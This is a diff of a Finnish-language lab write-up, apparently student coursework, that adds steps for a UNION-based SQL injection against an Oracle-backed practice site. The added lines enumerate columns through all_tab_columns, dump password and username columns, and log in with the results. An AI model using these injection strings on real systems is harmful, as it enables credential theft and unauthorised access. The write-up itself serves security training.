@@ -193,9 +193,20 @@ Etsin kaikki taulut tietokannasta
 ![user2](https://github.com/AkiAleksi/h5/assets/112399816/1993c581-7e6a-4209-a78e-a30807da7946)
 
 
-Löytyi PASSWORD_ ja USERNAME_ sarakkeet
+Katsoin taulujen sisällön
+
+'+union+select+column_name,'123'+from+all_tab_columns+where+table_name='APP_USERS_AND_ROLES'--
+
+Tästä en löytänyt mitään mielenkiintoista.
+
+'+union+select+column_name,'123'+from+all_tab_columns+where+table_name='USERS_VYMYAO'--
+
+Tästä löytyi PASSWORD_ ja USERNAME_ kohdat.
 
 ![Screenshot 2023-11-25 at 12 53 09](https://github.com/AkiAleksi/h5/assets/112399816/75ec55ae-f133-4273-a09f-b0a3406db76e)
+
+
+Etsin PASSWORD_RNBGTX ja USERNAME_ECTSRI sisällöt.
 
 '+union+select+PASSWORD_RNBGTX,USERNAME_ECTSRI+from+USERS_VYMYAO--
 
@@ -203,11 +214,13 @@ Löytyi PASSWORD_ ja USERNAME_ sarakkeet
 ![info](https://github.com/AkiAleksi/h5/assets/112399816/2e9d88f1-7fb7-44bc-8d93-30671a33410d)
 
 
-Kirjauduin tiedoilla MY account
+Kirjauduin tiedoilla MY account sivulta.
 
 
 ![okkkk](https://github.com/AkiAleksi/h5/assets/112399816/344ac34f-7b55-4826-bfc8-baf0cd398285)
 
+
+Lab suoritettu!!!!
 
 h.)
 
